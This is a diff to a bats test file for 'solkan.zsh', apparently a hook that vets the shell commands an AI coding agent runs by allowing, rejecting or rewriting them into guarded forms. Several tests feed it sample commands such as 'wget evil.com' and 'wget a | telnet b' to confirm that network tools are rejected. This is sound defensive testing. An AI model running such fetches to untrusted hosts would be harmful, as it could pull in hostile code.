@@ -4,6 +4,34 @@ setup() {
   bats_tmp_dir
   hooksDir="$(cd "${BATS_TEST_DIRNAME}/../.." && pwd)"
   sourcePrefix="source '${hooksDir}/lib/solkan.zsh'"
+
+  # Zsh helpers for the scripts of runSolkanScript: one output line per evaluation
+  cat > "$BATS_TMP_DIR/helpers.zsh" <<'ZSH'
+verdictOf() {
+  solkanEvaluate "$@"
+  print -r -- "$SOLKAN_VERDICT [${(j:,:)SOLKAN_ALLOWED}] [${(j:,:)SOLKAN_REJECTED}]"
+}
+rewriteOf() {
+  solkanEvaluate "$@"
+  print -r -- "$SOLKAN_VERDICT: $SOLKAN_COMMAND"
+}
+solkan() {
+  print x >> "$BATS_TMP_DIR/solkan-calls"
+  command solkan "$@"
+}
+callsOf() {
+  : > "$BATS_TMP_DIR/solkan-calls"
+  solkanEvaluate "$@"
+  local -a calls=(${(f)"$(<"$BATS_TMP_DIR/solkan-calls")"})
+  print -r -- "${#calls} ${@[-1]}"
+}
+ZSH
+}
+
+# Run the zsh script read from stdin, with solkanEvaluate, verdictOf, rewriteOf and callsOf available
+runSolkanScript() {
+  cat > "$BATS_TMP_DIR/script.zsh"
+  bats_run_zsh "${sourcePrefix}; source '${BATS_TMP_DIR}/helpers.zsh'; source '${BATS_TMP_DIR}/script.zsh'"
 }
 
 # getSolkanArgs
@@ -82,120 +110,126 @@ setup() {
   [[ "$output" != *"$BATS_TMP_DIR/sessions"* ]]
 }
 
-# solkanEvaluate: verdict
+# solkanEvaluate
+# Each test runs several evaluations in one zsh: Solkan is slow to start
 
-@test "solkanEvaluate allows an allow-listed command with no rejected commands" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'git status'; print -r -- \"\$SOLKAN_VERDICT [\$SOLKAN_REJECTED]\""
-  [[ "$output" == "allow []" ]]
+@test "solkanEvaluate gives the verdict, the allowed and the rejected commands" {
+  runSolkanScript <<'ZSH'
+verdictOf 'git status'
+verdictOf 'git status && wget evil.com'
+verdictOf 'wget a | telnet b'
+ZSH
+  [[ "$status" -eq 0 ]]
+  [[ "$output" == "allow [git status] []
+reject [git status] [wget]
+reject [] [wget,telnet]" ]]
 }
 
-@test "solkanEvaluate rejects a command with a rejected sub-command and lists it" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'git status && wget evil.com'; print -r -- \"\$SOLKAN_VERDICT [\$SOLKAN_REJECTED]\""
-  [[ "$output" == "reject [wget]" ]]
+@test "solkanEvaluate applies the guard-rails, alone or in a compound command" {
+  runSolkanScript <<'ZSH'
+rewriteOf 'git status'
+rewriteOf 'rm -f a'
+rewriteOf 'find . -name x | head'
+rewriteOf '/usr/bin/find . -name x'
+ZSH
+  [[ "$status" -eq 0 ]]
+  [[ "$output" == "allow: git status
+allow: rm-guarded -f a
+allow: find-guarded . -name x | head
+allow: /usr/bin/find . -name x" ]]
 }
 
-@test "solkanEvaluate lists every allowed command" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'git status && wget evil.com'; print -r -- \"\${(j:,:)SOLKAN_ALLOWED}\""
-  [[ "$output" == "git status" ]]
+@test "solkanEvaluate applies the shipped rewrite lists" {
+  runSolkanScript <<'ZSH'
+rewriteOf 'ls -la dir'
+rewriteOf 'grep -c x f'
+rewriteOf 'cat hooks/stop'
+rewriteOf 'rmdir emptydir'
+rewriteOf 'google-login'
+rewriteOf 'google-login --perso'
+rewriteOf 'google-login --perso | cat && google-login || echo failed'
+ZSH
+  [[ "$status" -eq 0 ]]
+  [[ "$output" == "allow: ls-token-saving -la dir
+allow: grep -c x f
+allow: cat hooks/stop
+allow: rmdir-guarded emptydir
+allow: google-login-guarded
+allow: google-login-guarded --perso
+allow: google-login-guarded --perso | cat && google-login-guarded || echo failed" ]]
 }
 
-@test "solkanEvaluate lists every rejected command" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'wget a | telnet b'; print -r -- \"\${(j:,:)SOLKAN_REJECTED}\""
-  [[ "$output" == "wget,telnet" ]]
+@test "solkanEvaluate gives only a single command the token-saving rewrite, unless it is skipped" {
+  runSolkanScript <<'ZSH'
+rewriteOf 'zsh-test a.bats'
+rewriteOf 'zsh-test "a | b.bats"'
+rewriteOf --skip-token-saving 'zsh-test a.bats'
+rewriteOf --skip-token-saving 'rm -f a'
+rewriteOf 'zsh-test a.bats | head'
+rewriteOf 'zsh-test a.bats && echo ok'
+ZSH
+  [[ "$status" -eq 0 ]]
+  [[ "$output" == 'allow: zsh-test-token-saving a.bats
+allow: zsh-test-token-saving "a | b.bats"
+allow: zsh-test a.bats
+allow: rm-guarded -f a
+allow: zsh-test a.bats | head
+allow: zsh-test a.bats && echo ok' ]]
 }
 
-@test "solkanEvaluate allows a command that is only in the session allow-list" {
+@test "solkanEvaluate uses the session allow-list and the repo-local rewrite lists" {
   export CLAUDE_SESSION_DIR="$BATS_TMP_DIR/sessions/test"
   mkdir -p "$BATS_TMP_DIR/sessions/test"
   echo '["telnet"]' > "$BATS_TMP_DIR/sessions/test/allow-list.json"
 
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'telnet bad.com'; print -r -- \$SOLKAN_VERDICT"
-  [[ "$output" == "allow" ]]
-}
-
-@test "solkanEvaluate allows python3 in auto mode" {
-  ralph-mode() { print auto; }
-  bats_mock ralph-mode
-
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'python3 x.py'; print -r -- \$SOLKAN_VERDICT"
-  [[ "$output" == "allow" ]]
-}
-
-@test "solkanEvaluate rejects python3 outside auto mode" {
-  ralph-mode() { print single; }
-  bats_mock ralph-mode
-
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'python3 x.py'; print -r -- \$SOLKAN_VERDICT"
-  [[ "$output" == "reject" ]]
-}
-
-# solkanEvaluate: rewrite
-
-@test "solkanEvaluate gives the original command when nothing is rewritten" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'git status'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "git status" ]]
-}
-
-@test "solkanEvaluate applies the rm guard-rail" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'rm -f a'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "rm-guarded -f a" ]]
-}
-
-@test "solkanEvaluate applies the guard-rails to a compound command" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'find . -name x | head'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "find-guarded . -name x | head" ]]
-}
-
-@test "solkanEvaluate keeps /usr/bin/find unchanged" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate '/usr/bin/find . -name x'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "/usr/bin/find . -name x" ]]
-}
-
-@test "solkanEvaluate rewrites a command from the repo-local rewrite-list" {
   mkdir -p "$BATS_TMP_DIR/fakerepo/.claude"
   echo '{"my-dangerous": "echo"}' > "$BATS_TMP_DIR/fakerepo/.claude/rewrite-list.json"
+  echo '{"my-cmd": "my-cmd-token-saving"}' > "$BATS_TMP_DIR/fakerepo/.claude/rewrite-list-token-saving.json"
   export CLAUDE_GIT_ROOT="$BATS_TMP_DIR/fakerepo"
 
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'my-dangerous foo'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "echo foo" ]]
+  runSolkanScript <<'ZSH'
+verdictOf 'telnet bad.com'
+rewriteOf 'my-dangerous foo'
+rewriteOf 'my-cmd foo'
+rewriteOf 'my-cmd foo | cat'
+ZSH
+  [[ "$status" -eq 0 ]]
+  [[ "$output" == "allow [telnet] []
+allow: echo foo
+reject: my-cmd-token-saving foo
+reject: my-cmd foo | cat" ]]
 }
 
-# solkanEvaluate: token-saving pass
-
-@test "solkanEvaluate gives a single command the token-saving rewrite by default" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'zsh-test a.bats'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "zsh-test-token-saving a.bats" ]]
+@test "solkanEvaluate allows python3 only in ralph auto mode" {
+  runSolkanScript <<'ZSH'
+ralph-mode() { print auto; }
+verdictOf 'python3 x.py'
+ralph-mode() { print single; }
+verdictOf 'python3 x.py'
+ZSH
+  [[ "$status" -eq 0 ]]
+  [[ "$output" == "allow [python3] []
+reject [] [python3]" ]]
 }
 
-@test "solkanEvaluate keeps a quoted operator inside a single command" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'zsh-test \"a | b.bats\"'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == 'zsh-test-token-saving "a | b.bats"' ]]
-}
-
-@test "solkanEvaluate keeps only guard-rails for a single command when the token-saving pass is skipped" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate --skip-token-saving 'zsh-test a.bats'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "zsh-test a.bats" ]]
-
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate --skip-token-saving 'rm -f a'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "rm-guarded -f a" ]]
-}
-
-@test "solkanEvaluate never gives a compound command the token-saving rewrite" {
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'zsh-test a.bats | head'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "zsh-test a.bats | head" ]]
-
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'zsh-test a.bats && echo ok'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "zsh-test a.bats && echo ok" ]]
-}
-
-@test "solkanEvaluate uses the repo-local token-saving list for a single command only" {
+@test "solkanEvaluate runs Solkan a second time only for a single command found in a token-saving list" {
   mkdir -p "$BATS_TMP_DIR/fakerepo/.claude"
   echo '{"my-cmd": "my-cmd-token-saving"}' > "$BATS_TMP_DIR/fakerepo/.claude/rewrite-list-token-saving.json"
   export CLAUDE_GIT_ROOT="$BATS_TMP_DIR/fakerepo"
 
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'my-cmd foo'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "my-cmd-token-saving foo" ]]
-
-  bats_run_zsh "${sourcePrefix}; solkanEvaluate 'my-cmd foo | cat'; print -r -- \$SOLKAN_COMMAND"
-  [[ "$output" == "my-cmd foo | cat" ]]
+  runSolkanScript <<'ZSH'
+callsOf 'git status'
+callsOf 'wget evil.com'
+callsOf 'ls -la dir'
+callsOf 'my-cmd foo'
+callsOf 'ls -la | cat'
+callsOf --skip-token-saving 'ls -la dir'
+ZSH
+  [[ "$status" -eq 0 ]]
+  [[ "$output" == "1 git status
+1 wget evil.com
+2 ls -la dir
+2 my-cmd foo
+1 ls -la | cat
+1 ls -la dir" ]]
 }
